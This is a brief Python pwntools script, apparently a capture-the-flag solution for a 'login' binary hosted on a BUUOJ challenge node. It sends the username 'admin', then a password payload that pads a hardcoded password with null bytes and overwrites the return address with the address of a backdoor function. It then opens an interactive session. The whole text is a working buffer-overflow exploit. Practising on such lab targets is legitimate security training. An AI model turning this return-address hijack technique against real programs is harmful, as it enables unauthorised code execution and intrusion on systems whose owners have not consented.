from pwn import *

#p = process('./login')
p = remote('node4.buuoj.cn', 29917)

backdoor = 0x400e88

payload = b'2jctf_pa5sw0rd' + b'\0' * 58 + p64(backdoor)

p.sendlineafter(': ', 'admin')
p.sendlineafter(': ', payload)

p.interactive()
